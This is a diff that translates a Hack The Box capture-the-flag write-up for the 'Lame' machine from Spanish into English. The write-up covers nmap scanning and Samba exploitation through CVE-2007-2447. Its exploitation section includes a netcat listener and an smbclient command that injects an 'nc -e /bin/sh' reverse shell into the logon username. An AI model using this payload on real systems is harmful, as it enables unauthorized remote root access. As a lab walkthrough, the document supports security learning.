@@ -1,6 +1,6 @@
 ---
 title: "HTB: Lame"
-description: "Resolución completa de la máquina Lame de Hack The Box."
+description: "Complete walkthrough for Lame machine from Hack The Box."
 publishDate: "2024-05-10"
 difficulty: "Easy"
 os: "Linux"
@@ -11,43 +11,43 @@ completed: true
 
 # HTB: Lame
 
-## Reconocimiento
+## Enumeration
 
-Comenzamos realizando un escaneo inicial de puertos con `nmap` para identificar los servicios expuestos en la máquina objetivo:
+We start with an initial port scan using `nmap` to discover open ports and services:
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
 ```
 
-A continuación, lanzamos un escaneo dirigido de versiones y scripts por defecto sobre los puertos abiertos detectados:
+Next, perform targeted script and version scanning on discovered open ports:
 
 ```bash
 nmap -sCV -p 21,22,139,445 10.10.10.3 -oN targeted
 ```
 
-## Explotación
+## Exploitation
 
-El servicio Samba en la versión detectada (Samba 3.0.20) es vulnerable a ejecución remota de comandos mediante la vulnerabilidad conocida como `usermap script` (CVE-2007-2447).
+The detected Samba version (Samba 3.0.20) is vulnerable to remote command execution via the `usermap script` flaw (CVE-2007-2447).
 
-Podemos verificar el acceso o explotar directamente mediante un listener:
+Start a netcat listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Y enviando el payload correspondiente a través de `smbclient` o script de explotación:
+Then trigger the exploit using `smbclient` by executing a reverse shell command:
 
 ```bash
 smbclient //10.10.10.3/tmp -c 'logon "/=`nohup nc -e /bin/sh 10.10.14.2 4444`"'
 ```
 
-## Post-Explotación
+## Post-Exploitation
 
-Una vez obtenida la shell, verificamos privilegios:
+Once the shell connects, verify the effective user privileges:
 
 ```bash
 whoami
 id
 ```
 
-La shell obtenida ya cuenta con privilegios de `root`.
+The shell grants direct `root` access.
